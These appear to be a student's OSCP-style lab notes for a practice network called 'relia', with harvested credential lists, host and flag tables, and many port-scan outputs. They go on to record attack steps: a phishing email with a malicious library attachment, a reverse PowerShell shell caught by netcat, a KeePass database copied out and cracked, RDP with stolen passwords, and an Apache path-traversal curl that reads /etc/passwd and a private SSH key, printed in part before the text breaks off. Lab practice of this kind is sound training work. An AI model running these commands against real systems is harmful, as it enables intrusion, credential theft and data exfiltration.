

## Credentials
mark@relia.com: OathDeeplyReprieve91
damon 
maildmz@relia.com:DPuBT9tGCBrTbR
jim@relia.com
jim:mercedes1
## Users
anita
mark
steven
miranda
offsec
emma
adrian
damon

## Passwords
OathDeeplyReprieve91
fireball
SomersetVinyl1!
!8@aBRBYdb3!
DPuBT9tGCBrTbR
#### AD - Creds 
jim:Castello1!
dmzadmin:SlimGodhoodMope
###### User
jim
dmzadmin

##### Pass
SlimGodhoodMope
Castello1!

## Pathways
245 > 246 > 247 > 248 > 249 > 189/14/191 > 


## HOSTNAME and RELIA FLAGS (15)

 .189 - proof only
.191 - proof only
Web01 - .245 - local and proof
Demo - .246 - local and proof
.247 - local and proof
.248 - local and proof
.249 - local and proof
.250 - NONE (WINPREP machine)

DC2 - .6 - proof only
INTRANET - .7 - local and proof
WK01 - .14 - local and proof 
WK02 - .15 - local and proof
.19 - local and proof
.20 - local and proof
FILES - .21 - proof only
WEBBY - .30 - proof only


## 6
1. Nmap scan
```
proxychains nmap -sT --top-ports=20 $Ip
PORT     STATE  SERVICE
21/tcp   closed ftp
22/tcp   closed ssh
23/tcp   closed telnet
25/tcp   closed smtp
53/tcp   closed domain
80/tcp   open   http
110/tcp  closed pop3
111/tcp  closed rpcbind
135/tcp  open   msrpc
139/tcp  open   netbios-ssn
143/tcp  closed imap
443/tcp  open   https
445/tcp  open   microsoft-ds
993/tcp  closed imaps
995/tcp  closed pop3s
1723/tcp closed pptp
3306/tcp open   mysql
3389/tcp open   ms-wbt-server
5900/tcp closed vnc
8080/tcp closed http-proxy



┌──(kali㉿kali)-[~/OSCP/labs/relia]
└─$ nmap -A -T4 172.16.84.6 -Pn
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-02-16 08:13 EST
Nmap scan report for 172.16.84.6
Host is up (0.39s latency).
Not shown: 989 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-02-16 13:14:17Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: relia.com0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3269/tcp open  tcpwrapped
3389/tcp open  ms-wbt-server Microsoft Terminal Services
|_ssl-date: 2024-02-16T13:15:18+00:00; 0s from scanner time.
| ssl-cert: Subject: commonName=DC02.relia.com
| Not valid before: 2023-10-09T17:09:39
|_Not valid after:  2024-04-09T17:09:39
| rdp-ntlm-info: 
|   Target_Name: RELIA
|   NetBIOS_Domain_Name: RELIA
|   NetBIOS_Computer_Name: DC02
|   DNS_Domain_Name: relia.com
|   DNS_Computer_Name: DC02.relia.com
|   DNS_Tree_Name: relia.com
|   Product_Version: 10.0.20348
|_  System_Time: 2024-02-16T13:14:39+00:00
Service Info: Host: DC02; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2024-02-16T13:14:38
|_  start_date: N/A
|_nbstat: NetBIOS name: DC02, NetBIOS user: <unknown>, NetBIOS MAC: 00:50:56:86:78:06 (VMware)
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 98.84 seconds

```

## 7
```
proxychains nmap -sT --top-ports=20 $Ip
PORT     STATE  SERVICE
21/tcp   closed ftp
22/tcp   closed ssh
23/tcp   closed telnet
25/tcp   closed smtp
53/tcp   closed domain
80/tcp   open   http
110/tcp  closed pop3
111/tcp  closed rpcbind
135/tcp  open   msrpc
139/tcp  open   netbios-ssn
143/tcp  closed imap
443/tcp  open   https
445/tcp  open   microsoft-ds
993/tcp  closed imaps
995/tcp  closed pop3s
1723/tcp closed pptp
3306/tcp open   mysql
3389/tcp open   ms-wbt-server
5900/tcp closed vnc
8080/tcp closed http-proxy



┌──(kali㉿kali)-[~/OSCP/labs/relia]
└─$ nmap -A -T4 172.16.84.7 -Pn
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-02-16 08:18 EST
Nmap scan report for 172.16.84.7
Host is up (0.38s latency).
Not shown: 995 filtered tcp ports (no-response)
PORT    STATE SERVICE       VERSION
80/tcp  open  http          Apache httpd 2.4.53 ((Win64) OpenSSL/1.1.1n PHP/7.4.29)
|_http-server-header: Apache/2.4.53 (Win64) OpenSSL/1.1.1n PHP/7.4.29
| http-title: RELIA INTRANET &#8211; Just another WordPress site
|_Requested resource was http://172.16.84.7/wordpress/
|_http-generator: WordPress 6.0.3
135/tcp open  msrpc         Microsoft Windows RPC
139/tcp open  netbios-ssn   Microsoft Windows netbios-ssn
443/tcp open  ssl/http      Apache httpd 2.4.53 ((Win64) OpenSSL/1.1.1n PHP/7.4.29)
| tls-alpn: 
|_  http/1.1
|_http-server-header: Apache/2.4.53 (Win64) OpenSSL/1.1.1n PHP/7.4.29
|_http-generator: WordPress 6.0.3
|_ssl-date: TLS randomness does not represent time
| http-title: RELIA INTRANET &#8211; Just another WordPress site
|_Requested resource was https://172.16.84.7/wordpress/
| ssl-cert: Subject: commonName=localhost
| Not valid before: 2009-11-10T23:48:47
|_Not valid after:  2019-11-08T23:48:47
445/tcp open  microsoft-ds?
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2024-02-16T13:19:14
|_  start_date: N/A
|_nbstat: NetBIOS name: INTRANET, NetBIOS user: <unknown>, NetBIOS MAC: 00:50:56:86:79:88 (VMware)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 95.58 seconds

```


## 14
1. Automatically connect to this machine when performing phishing attack on 191
```
PS C:\Users> ipconfig
ipconfig

Windows IP Configuration


Ethernet adapter Ethernet0:

   Connection-specific DNS Suffix  . : 
   IPv4 Address. . . . . . . . . . . : 172.16.84.14
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : 172.16.84.254
```

2. Obtained local and proof.txt. 
```
PS C:\Users\jim\desktop> cat local.txt
cat local.txt
999a39c9fc248820bfc359e3d17dcf5a

PS C:\Users\offsec\Desktop> cat proof.txt
cat proof.txt
4292b5e04eb773846a9322aff1cd4aa2
```


## 15
```
proxychains nmap -sT --top-ports=20 $Ip

PORT     STATE  SERVICE
21/tcp   closed ftp
22/tcp   closed ssh
23/tcp   closed telnet
25/tcp   closed smtp
53/tcp   closed domain
80/tcp   closed http
110/tcp  closed pop3
111/tcp  closed rpcbind
135/tcp  open   msrpc
139/tcp  open   netbios-ssn
143/tcp  closed imap
443/tcp  closed https
445/tcp  open   microsoft-ds
993/tcp  closed imaps
995/tcp  closed pop3s
1723/tcp closed pptp
3306/tcp closed mysql
3389/tcp open   ms-wbt-server
5900/tcp closed vnc
8080/tcp closed http-proxy

┌──(kali㉿kali)-[~/OSCP/labs/relia]
└─$ nmap -A -T4 172.16.84.15 -Pn
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-02-16 08:20 EST
Nmap scan report for 172.16.84.15
Host is up (0.39s latency).
Not shown: 998 filtered tcp ports (no-response)
PORT    STATE SERVICE     VERSION
135/tcp open  msrpc       Microsoft Windows RPC
139/tcp open  netbios-ssn Microsoft Windows netbios-ssn
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_nbstat: NetBIOS name: WK02, NetBIOS user: <unknown>, NetBIOS MAC: 00:50:56:86:b5:1a (VMware)
| smb2-time: 
|   date: 2024-02-16T13:20:58
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 74.45 seconds

```


## 19
```
proxychains nmap -sT --top-ports=20 $Ip

PORT     STATE  SERVICE
21/tcp   closed ftp
22/tcp   open   ssh
23/tcp   closed telnet
25/tcp   closed smtp
53/tcp   closed domain
80/tcp   closed http
110/tcp  closed pop3
111/tcp  closed rpcbind
135/tcp  closed msrpc
139/tcp  closed netbios-ssn
143/tcp  closed imap
443/tcp  closed https
445/tcp  closed microsoft-ds
993/tcp  closed imaps
995/tcp  closed pop3s
1723/tcp closed pptp
3306/tcp closed mysql
3389/tcp closed ms-wbt-server
5900/tcp closed vnc
8080/tcp closed http-proxy



┌──(kali㉿kali)-[~/OSCP/labs/relia]
└─$ nmap -A -T4 172.16.84.19 -Pn
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-02-16 08:22 EST
Nmap scan report for 172.16.84.19
Host is up.
All 1000 scanned ports on 172.16.84.19 are in ignored states.
Not shown: 1000 filtered tcp ports (no-response)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 108.24 seconds

```


## 20
```
proxychains nmap -sT --top-ports=20 $Ip

PORT     STATE  SERVICE
21/tcp   closed ftp
22/tcp   open   ssh
23/tcp   closed telnet
25/tcp   closed smtp
53/tcp   closed domain
80/tcp   closed http
110/tcp  closed pop3
111/tcp  closed rpcbind
135/tcp  closed msrpc
139/tcp  closed netbios-ssn
143/tcp  closed imap
443/tcp  closed https
445/tcp  closed microsoft-ds
993/tcp  closed imaps
995/tcp  closed pop3s
1723/tcp closed pptp
3306/tcp closed mysql
3389/tcp closed ms-wbt-server
5900/tcp closed vnc
8080/tcp closed http-proxy

┌──(kali㉿kali)-[~/OSCP/labs/relia]
└─$ nmap -A -T4 172.16.84.20 -Pn
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-02-16 08:23 EST
Nmap scan report for 172.16.84.20
Host is up (0.37s latency).
Not shown: 999 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9 (FreeBSD 20200214; protocol 2.0)
| ssh-hostkey: 
|   2048 33:4a:77:87:5b:88:f4:f1:f3:bb:75:7b:ec:9e:21:31 (RSA)
|   256 c8:3a:f1:c9:e1:9c:31:2d:9d:26:df:c7:c5:21:d8:e3 (ECDSA)
|_  256 f6:79:92:a4:06:56:38:e3:ca:15:91:a8:dc:94:44:2c (ED25519)
Service Info: OS: FreeBSD; CPE: cpe:/o:freebsd:freebsd

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 182.21 seconds

```


## 21
```
proxychains nmap -sT --top-ports=20 $Ip

PORT     STATE  SERVICE
21/tcp   closed ftp
22/tcp   closed ssh
23/tcp   closed telnet
25/tcp   closed smtp
53/tcp   closed domain
80/tcp   closed http
110/tcp  closed pop3
111/tcp  closed rpcbind
135/tcp  open   msrpc
139/tcp  open   netbios-ssn
143/tcp  closed imap
443/tcp  closed https
445/tcp  open   microsoft-ds
993/tcp  closed imaps
995/tcp  closed pop3s
1723/tcp closed pptp
3306/tcp closed mysql
3389/tcp closed ms-wbt-server
5900/tcp closed vnc
8080/tcp closed http-proxy

┌──(kali㉿kali)-[~/OSCP/labs/relia]
└─$ nmap -A -T4 172.16.84.21 -Pn
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-02-16 08:27 EST
Nmap scan report for 172.16.84.21
Host is up (0.37s latency).
Not shown: 997 filtered tcp ports (no-response)
PORT    STATE SERVICE       VERSION
135/tcp open  msrpc         Microsoft Windows RPC
139/tcp open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp open  microsoft-ds?
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_nbstat: NetBIOS name: FILES, NetBIOS user: <unknown>, NetBIOS MAC: 00:50:56:86:eb:8d (VMware)
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2024-02-16T13:28:04
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 92.83 seconds

```


## 30
```
proxychains nmap -sT --top-ports=20 $Ip

PORT     STATE  SERVICE
21/tcp   closed ftp
22/tcp   closed ssh
23/tcp   closed telnet
25/tcp   closed smtp
53/tcp   closed domain
80/tcp   open   http
110/tcp  closed pop3
111/tcp  closed rpcbind
135/tcp  open   msrpc
139/tcp  open   netbios-ssn
143/tcp  closed imap
443/tcp  closed https
445/tcp  open   microsoft-ds
993/tcp  closed imaps
995/tcp  closed pop3s
1723/tcp closed pptp
3306/tcp closed mysql
3389/tcp open   ms-wbt-server
5900/tcp closed vnc
8080/tcp closed http-proxy



┌──(kali㉿kali)-[~/OSCP/labs/relia]
└─$ nmap -A -T4 172.16.84.30 -Pn
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-02-16 08:28 EST
Nmap scan report for 172.16.84.30
Host is up (0.37s latency).
Not shown: 998 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
445/tcp  open  microsoft-ds?
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| ssl-cert: Subject: commonName=WEBBY.relia.com
| Not valid before: 2024-02-15T11:46:24
|_Not valid after:  2024-08-16T11:46:24
| rdp-ntlm-info: 
|   Target_Name: RELIA
|   NetBIOS_Domain_Name: RELIA
|   NetBIOS_Computer_Name: WEBBY
|   DNS_Domain_Name: relia.com
|   DNS_Computer_Name: WEBBY.relia.com
|   DNS_Tree_Name: relia.com
|   Product_Version: 10.0.20348
|_  System_Time: 2024-02-16T13:29:46+00:00
|_ssl-date: 2024-02-16T13:30:25+00:00; 0s from scanner time.
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
|_nbstat: NetBIOS name: WEBBY, NetBIOS user: <unknown>, NetBIOS MAC: 00:50:56:86:8d:cf (VMware)
| smb2-time: 
|   date: 2024-02-16T13:29:47
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 91.13 seconds


```


## 189
1. Rustscan and Nmap scans
```
rustscan 192.168.208.189

PORT      STATE SERVICE      REASON
25/tcp    open  smtp         syn-ack
110/tcp   open  pop3         syn-ack
135/tcp   open  msrpc        syn-ack
139/tcp   open  netbios-ssn  syn-ack
143/tcp   open  imap         syn-ack
445/tcp   open  microsoft-ds syn-ack
587/tcp   open  submission   syn-ack
5985/tcp  open  wsman        syn-ack
47001/tcp open  winrm        syn-ack
49664/tcp open  unknown      syn-ack
49665/tcp open  unknown      syn-ack
49666/tcp open  unknown      syn-ack
49667/tcp open  unknown      syn-ack
49668/tcp open  unknown      syn-ack
49669/tcp open  unknown      syn-ack
49670/tcp open  unknown      syn-ack

┌──(kali㉿kali)-[~/OSCP/labs/relia]
└─$ nmap -p$(cat 189-open-ports.txt | cut -f1 -d '/' | tr '\n' ',') -T4 -A 192.168.208.189  

Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-02-14 01:28 EST
Nmap scan report for 192.168.208.189
Host is up (0.39s latency).

PORT      STATE SERVICE       VERSION
25/tcp    open  smtp          hMailServer smtpd
| smtp-commands: MAIL, SIZE 20480000, AUTH LOGIN, HELP
|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY
110/tcp   open  pop3          hMailServer pop3d
|_pop3-capabilities: USER UIDL TOP
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
143/tcp   open  imap          hMailServer imapd
|_imap-capabilities: IMAP4 IMAP4rev1 IDLE SORT QUOTA CAPABILITY completed NAMESPACE RIGHTS=texkA0001 OK CHILDREN ACL
445/tcp   open  microsoft-ds?
587/tcp   open  smtp          hMailServer smtpd
| smtp-commands: MAIL, SIZE 20480000, AUTH LOGIN, HELP
|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
49670/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: MAIL; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2024-02-14T06:29:34
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 84.34 seconds
```

2. Start phishing with obtained emails
```
Created config  and automatic_configuration fiels as per exercise 11
```

3. Then, started attacks obtained 
```
┌──(kali㉿kali)-[~/OSCP/labs/relia]
└─$ python -m http.server 8000 
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
192.168.194.191 - - [16/Feb/2024 02:38:13] "GET /powercat.ps1 HTTP/1.1" 200 -

──(kali㉿kali)-[~/OSCP/labs/relia]
└─$ /home/kali/.local/bin/wsgidav --host=0.0.0.0 --port=80 --auth=anonymous --root /home/kali/webdav/


┌──(kali㉿kali)-[~/webdav]
└─$ sudo swaks -t jim@relia.com --from maildmz@relia.com --attach @config.Library-ms --server 192.168.194.189 --body @test.txt --header "Subject: Staging Script" --suppress-data -ap



┌──(kali㉿kali)-[~/OSCP/labs/relia]
└─$ nc -nvlp 4444          
listening on [any] 4444 ...
connect to [192.168.45.242] from (UNKNOWN) [192.168.194.191] 63166
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

Install the latest PowerShell for new features and improvements! https://aka.ms/PSWindows

PS C:\Windows\System32\WindowsPowerShell\v1.0>
```

4. Found database.kdbx, break it and found 'mercedes1' as pass. 
```
┌──(kali㉿kali)-[~/OSCP/labs/relia]
└─$  python3 /home/kali/impacket/examples/smbserver.py -smb2support myshare . 
Impacket v0.11.0 - Copyright 2023 Fortra

PS C:\> copy C:\Users\jim\Documents\Database.kdbx \\192.168.45.242\myshare\Database.kdbx
copy C:\Users\jim\Documents\Database.kdbx \\192.168.45.242\myshare\Database.kdbx

┌──(kali㉿kali)-[~/OSCP/labs/relia]
└─$  keepass2john Database.kdbx > keepass1.hash



┌──(kali㉿kali)-[~/OSCP/labs/relia]
└─$ hashcat -m 13400 keepass1.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/rockyou-30000.rule --force

$keepass$*2*60*0*ed890395c5503e50453897e48fd2d79ece2ae3466b51b6fb941cd413f5c89b43*3edacb91f15bae05d3fd546f201cd8924676b662f6101ba57155e0f4aeae9b61*7a963146ec300519645fbc90ca4e258d*90939579da95cd23a9c90aef5a7a507d7c9ee647ed47c0fa05729a1262d7d73e*e97f9fe2f7a1efe24b054dfcb47e8edab5dd7eb96c5731f32e64a9d3a1db5dcf:mercedes1

```

5. Open kdbx file with obtained creds. Found 2 users creds
```
┌──(kali㉿kali)-[~/OSCP/labs/relia]
└─$ kpcli --kdb=Database.kdbx 

kpcli:/Database/General> show -f 0

Title: LOGIN local admin
Uname: dmzadmin
 Pass: SlimGodhoodMope
  URL: 
Notes: 

kpcli:/Database/General> show -f 1

Title: User Password
Uname: jim@relia.com
 Pass: Castello1!
  URL: 
Notes: 

```
## 191
1. Rustscan and Nmap scans
```
rustscan 192.168.208.191


PORT      STATE SERVICE       REASON
80/tcp    open  http          syn-ack
135/tcp   open  msrpc         syn-ack
139/tcp   open  netbios-ssn   syn-ack
445/tcp   open  microsoft-ds  syn-ack
3389/tcp  open  ms-wbt-server syn-ack
5985/tcp  open  wsman         syn-ack
47001/tcp open  winrm         syn-ack
49664/tcp open  unknown       syn-ack
49665/tcp open  unknown       syn-ack
49666/tcp open  unknown       syn-ack
49667/tcp open  unknown       syn-ack
49668/tcp open  unknown       syn-ack
49669/tcp open  unknown       syn-ack
49670/tcp open  unknown       syn-ack
49671/tcp open  unknown       syn-ack


                                                                                      
┌──(kali㉿kali)-[~/OSCP/labs/relia]
└─$ nmap -p$(cat 191-open-ports.txt | cut -f1 -d '/' | tr '\n' ',') -T4 -A 192.168.208.191

Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-02-14 01:29 EST
Nmap scan report for 192.168.208.191
Host is up (0.39s latency).

PORT      STATE SERVICE       VERSION
80/tcp    open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
| http-auth: 
| HTTP/1.1 401 Unauthorized\x0D
|_  Basic realm=192.168.208.191
|_http-title: 401 - Unauthorized: Access is denied due to invalid credentials.
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: RELIA
|   NetBIOS_Domain_Name: RELIA
|   NetBIOS_Computer_Name: LOGIN
|   DNS_Domain_Name: relia.com
|   DNS_Computer_Name: login.relia.com
|   DNS_Tree_Name: relia.com
|   Product_Version: 10.0.20348
|_  System_Time: 2024-02-14T06:30:47+00:00
|_ssl-date: 2024-02-14T06:30:57+00:00; 0s from scanner time.
| ssl-cert: Subject: commonName=login.relia.com
| Not valid before: 2024-01-29T03:56:06
|_Not valid after:  2024-07-30T03:56:06
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
49670/tcp open  msrpc         Microsoft Windows RPC
49671/tcp open  msrpc         Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2024-02-14T06:30:49
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 74.10 seconds
```

2. Used dmzadmin creds from 189 to rpd and obtain flag in desktop
```
┌──(kali㉿kali)-[~/OSCP/labs/relia]
└─$ xfreerdp /cert-ignore /u:dmzadmin /p:'SlimGodhoodMope' /v:192.168.194.191

559557270c4cdcdaddb6e6401bc2aae5
```

## 245
1. Rustscan and Nmap scans
```
rustscan 192.168.208.245


Open 192.168.208.245:21
Open 192.168.208.245:80
Open 192.168.208.245:443
Open 192.168.208.245:2222
Open 192.168.208.245:8000


┌──(kali㉿kali)-[~/OSCP/labs/relia]
└─$ nmap -p$(cat 245-open-ports.txt | cut -f1 -d '/' | tr '\n' ',') -T4 -A 192.168.208.245 

Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-02-14 01:19 EST
Nmap scan report for 192.168.208.245
Host is up (0.39s latency).

PORT     STATE SERVICE  VERSION
21/tcp   open  ftp      vsftpd 2.0.8 or later
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to 192.168.45.242
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
80/tcp   open  http     Apache httpd 2.4.49 ((Unix) OpenSSL/1.1.1f mod_wsgi/4.9.4 Python/3.8)
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Apache/2.4.49 (Unix) OpenSSL/1.1.1f mod_wsgi/4.9.4 Python/3.8
|_http-title: RELIA Corp.
443/tcp  open  ssl/http Apache httpd 2.4.49 ((Unix) OpenSSL/1.1.1f mod_wsgi/4.9.4 Python/3.8)
|_http-title: RELIA Corp.
| tls-alpn: 
|_  http/1.1
|_http-server-header: Apache/2.4.49 (Unix) OpenSSL/1.1.1f mod_wsgi/4.9.4 Python/3.8
|_ssl-date: TLS randomness does not represent time
| http-methods: 
|_  Potentially risky methods: TRACE
| ssl-cert: Subject: commonName=web01.relia.com/organizationName=RELIA/stateOrProvinceName=Berlin/countryName=DE
| Not valid before: 2022-10-12T08:55:44
|_Not valid after:  2032-10-09T08:55:44
2222/tcp open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 30:0c:6c:9b:ac:07:47:5e:df:6d:ff:38:63:38:2a:fd (RSA)
|   256 f3:a9:70:76:c8:d4:c4:17:f4:39:1f:be:58:9d:1f:a5 (ECDSA)
|_  256 21:a0:79:82:2d:e6:2a:76:11:24:2f:7e:2e:a8:c7:83 (ED25519)
8000/tcp open  http     Apache httpd 2.4.49 ((Unix) OpenSSL/1.1.1f mod_wsgi/4.9.4 Python/3.8)
|_http-title: Site doesn't have a title (text/html).
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Apache/2.4.49 (Unix) OpenSSL/1.1.1f mod_wsgi/4.9.4 Python/3.8
|_http-open-proxy: Proxy might be redirecting requests
Service Info: Host: RELIA; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 36.73 seconds
```

2. After scanning all the webpages, it was found to be vulnerable with absolute directory transversal attack. 
```
┌──(kali㉿kali)-[~/OSCP/labs/relia]
└─$ curl http://192.168.208.245/cgi-bin/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
syslog:x:104:110::/home/syslog:/usr/sbin/nologin
_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:110:1::/var/cache/pollinate:/bin/false
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
offsec:x:1000:1000:Offsec Admin:/home/offsec:/bin/bash
lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
miranda:x:1001:1001:Miranda:/home/miranda:/bin/sh
steven:x:1002:1002:Steven:/home/steven:/bin/sh
mark:x:1003:1003:Mark:/home/mark:/bin/sh
anita:x:1004:1004:Anita:/home/anita:/bin/sh
apache:x:997:998::/opt/apache2/htdocs/:/sbin/nologin
usbmux:x:111:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
ftp:x:112:118:ftp daemon,,,:/srv/ftp:/usr/sbin/nologin
sshd:x:113:65534::/run/sshd:/usr/sbin/nologin
```

3. Find out id_rsa file for anita
```
┌──(kali㉿kali)-[~/OSCP/labs/relia]
└─$ curl http://192.168.208.245/cgi-bin/%2e%2e/%2e%2e/%2e%2e/%2e%2e/home/anita/.ssh/id_ecdsa
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAACmFlczI1Ni1jdHIAAAAGYmNyeXB0AAAAGAAAABAO+eRFhQ
13fn2kJ8qptynMAAAAEAAAAAEAAABoAAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlz
dHAyNTYAAABBBK+thAjaRTfNYtnThUoCv2Ns6FQtGtaJLBpLhyb74hSOp1pn0pm0rmNThM
fArBngFjl7RJYCOTqY5Mmid0sNJwAAAACw0HaBF7zp/0Kiunf161d9NFPIY2bdCayZsxnF
